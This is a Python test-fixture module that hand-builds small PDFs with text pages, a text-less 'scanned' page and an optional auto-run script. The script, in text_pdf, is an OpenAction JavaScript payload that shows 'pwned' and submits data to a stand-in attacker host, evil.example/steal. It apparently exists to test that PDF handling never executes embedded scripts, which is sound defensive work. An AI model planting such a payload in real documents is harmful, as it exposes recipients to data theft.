"""Tiny hand-built PDFs for tests (no PDF library needed to create them)."""

from __future__ import annotations


def _pdf(objects: list[bytes]) -> bytes:
    out = b"%PDF-1.4\n"
    offsets = []
    for i, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode() + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode()
    out += b"".join(f"{o:010d} 00000 n \n".encode() for o in offsets)
    out += f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return out


def text_pdf(pages: list[list[str]], javascript: bool = False) -> bytes:
    """One page per list of lines. javascript=True adds an OpenAction script (which must never run)."""
    n = len(pages)
    kids = " ".join(f"{3 + 2 * i} 0 R" for i in range(n))
    font_id = 3 + 2 * n
    js_id = font_id + 1
    catalog = b"<< /Type /Catalog /Pages 2 0 R" + (f" /OpenAction {js_id} 0 R".encode() if javascript else b"") + b" >>"
    objs = [catalog, f"<< /Type /Pages /Kids [{kids}] /Count {n} >>".encode()]
    for i, lines in enumerate(pages):
        ops = "BT /F1 11 Tf 72 740 Td 14 TL " + " ".join("(" + ln.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)") + ") '" for ln in lines) + " ET"
        stream = ops.encode()
        objs.append(f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 {font_id} 0 R >> >> "
                    f"/Contents {4 + 2 * i} 0 R >>".encode())
        objs.append(f"<< /Length {len(stream)} >>\nstream\n".encode() + stream + b"\nendstream")
    objs.append(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
    if javascript:
        objs.append(b"<< /S /JavaScript /JS (app.alert('pwned'); this.submitForm('https://evil.example/steal');) >>")
    return _pdf(objs)


def scanned_pdf() -> bytes:
    """A page with only a drawn rectangle: no text layer, like a scan."""
    stream = b"0.5 g 72 72 468 648 re f"
    return _pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
                 b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>",
                 f"<< /Length {len(stream)} >>\nstream\n".encode() + stream + b"\nendstream"])
